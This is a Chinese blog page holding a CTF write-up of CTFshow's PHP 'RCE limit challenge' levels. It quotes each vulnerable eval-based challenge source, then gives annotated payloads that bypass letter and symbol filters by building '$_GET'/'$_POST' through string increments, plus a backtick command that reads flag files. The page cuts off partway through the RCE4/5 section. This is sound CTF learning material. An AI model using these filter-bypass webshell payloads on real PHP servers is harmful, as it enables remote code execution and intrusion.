<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="万幸得以相识">
<meta property="og:type" content="website">
<meta property="og:title" content="晴川&#39;s Blog">
<meta property="og:url" content="https://qingchuana.github.io/page/2/index.html">
<meta property="og:site_name" content="晴川&#39;s Blog">
<meta property="og:description" content="万幸得以相识">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Qingchuan">
<meta property="article:tag" content="ctf 小菜鸡 热爱">
<meta name="twitter:card" content="summary"><title>晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/page/2/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/01/%E5%AE%8F/">CTFshow-RCE极限大挑战</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="CTFshow-RCE极限大挑战">
          <a href="#CTFshow-RCE极限大挑战" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTFshow-RCE极限大挑战" class="headerlink" title="CTFshow-RCE极限大挑战"></a>CTFshow-RCE极限大挑战</h1>
      
        <h2 id="前言">
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ctfshow&spm=1001.2101.3001.7020">ctfshow</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>出的这五道rce感觉挺好玩的，但自己没做出几道来，所以来详细的复现一下，这几道题基本都是利用的自增，但长度逐渐缩短，雀氏极限。</p>

        <h2 id="RCE1">
          <a href="#RCE1" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2>
      
        <h3 id="源码">
          <a href="#源码" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码" class="headerlink" title="源码"></a>源码</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="分析">
          <a href="#分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析" class="headerlink" title="分析"></a>分析</h3>
      <p>可以看到我们最后执行的是eval，而过滤的只有( 和. ，而php <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=eval%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">eval函数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>的作用是把字符串按照PHP代码来计算，比如果我们写入 echo <code>1</code> 就会写入1 ，如果我们写入的是一句话木马，就可以成功植入木马，执行rce</p>

        <h3 id="payload">
          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>
      <blockquote>

        <h3 id="code-echo-1-cat-f">
          <a href="#code-echo-1-cat-f" class="heading-link"><i class="fas fa-link"></i></a><a href="#code-echo-1-cat-f" class="headerlink" title="code=echo ``;&amp;1=cat /f*"></a><code>code=echo ``;&amp;1=cat /f*</code></h3>
      </blockquote>

        <h2 id="RCE2">
          <a href="#RCE2" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="分析-1">
          <a href="#分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3>
      <p>基本把能用的都过滤了，只剩下$()_+;[],.&#x3D;&#x2F;字符，p神的文章好早之前就提出过，自增<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=rce&spm=1001.2101.3001.7020">rce</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>思路就是，我们rce需要字母，但字母都过滤了，所以我们就要想办法去构造字母，p神是用</p>
<p>强制连接数组和字符串，数组将被转换成字符串，其值为<code>Array，而我们如果取Array的第[0]</code>个字母的话就是A，而A++就是B，例如：</p>
<p><img src="/2023/10/01/%E5%AE%8F/AAwangzhan\1\hexoblog\img\37853e892a9643ac805787746756841c.png"></p>
<p> 之后我们可以用 . 把字母拼接起来，</p>

        <h3 id="payload-1">
          <a href="#payload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3>
      <p>注释有分解。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;  <span class="comment">//得到Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   <span class="comment">//让[]里的值报错返回0,取Array[0]=A，此时$_=A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;   <span class="comment">//让$____=_，后面容易拼接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//将A赋给$__</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增到G，此时$__=G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>; <span class="comment">//将_和G拼接起来，此时$____=_G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//再将$__还原成A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增到E,此时__=E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//E和_G拼接，此时$____为_GE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;  <span class="comment">//再将__换源成A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增成T此时__=T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//再拼接成_GET，此时$____=_GET</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$____</span>;   <span class="comment">//为了方便起见，我们把____换成_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="variable">$$_</span>[_])(<span class="variable">$$_</span>[__]);  <span class="comment">//拼成我们想要的($_GET[_])($_GET[__]),传入_和__命令执行即可  </span></span><br></pre></td></tr></table></div></figure>

<p>最后换成一行rce即可 </p>

        <h2 id="RCE3">
          <a href="#RCE3" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h2>
      
        <h3 id="源码-1">
          <a href="#源码-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="分析-2">
          <a href="#分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3>
      <p>这个过滤和rce2差不多，但吧1和0给放出来了，也限制了长度&lt;&#x3D;105，可以看一下这个文章</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/119535886">BSides Noida CTF 2021 Web Calculate_bfengj的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><img src="/2023/10/01/%E5%AE%8F/AAwangzhan\1\hexoblog\img\12da9e9234fe43ac8601092b9b0a8d2f.png"></p>
<p>得到NAN再用上面相同的方法获得N,从N开始构造的话长度就比上一个方法少多了，原理还是上一题的自增，试着构造一下，当我是想直接$a[0]的时候，他没有回显，原来是因为现在的NAN还不算字符串,所以后面要在拼接一个例如</p>
<p><img src="/2023/10/01/%E5%AE%8F/AAwangzhan\1\hexoblog\img\96dcc086cb314c4c9a6f2503450c2089.png"></p>
<p>就可以得到我们想要的N了，但我我们需要字母才能构造N，就用上一题同样的方法构造出A来，因为0可以用了，所以我们就不用让报错直接用[0]就可以了</p>
<p><img src="/2023/10/01/%E5%AE%8F/AAwangzhan\1\hexoblog\img\7bbcda92852545ce97dbd2d22b130783.png"></p>
<p>然后我们就可以得到N了</p>
<p><img src="/2023/10/01/%E5%AE%8F/AAwangzhan\1\hexoblog\img\fc6729792a6c44d68b05e5e91c2b82a7.png"></p>
<p>之后再跟上一步一样一步一步自增就可以了</p>

        <h3 id="payload-2">
          <a href="#payload-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3>
      <p>注释有解析。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//得到Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//拼接PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//拼接_和POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="RCE4，RCE5">
          <a href="#RCE4，RCE5" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE4，RCE5" class="headerlink" title="RCE4，RCE5"></a>RCE4，RCE5</h2>
      <p>之后就是越来越少的长度，就直接分析一下师傅们的pyload</p>

        <h3 id="72位">
          <a href="#72位" class="heading-link"><i class="fas fa-link"></i></a><a href="#72位" class="headerlink" title="72位"></a>72位</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></div></figure>

<blockquote>
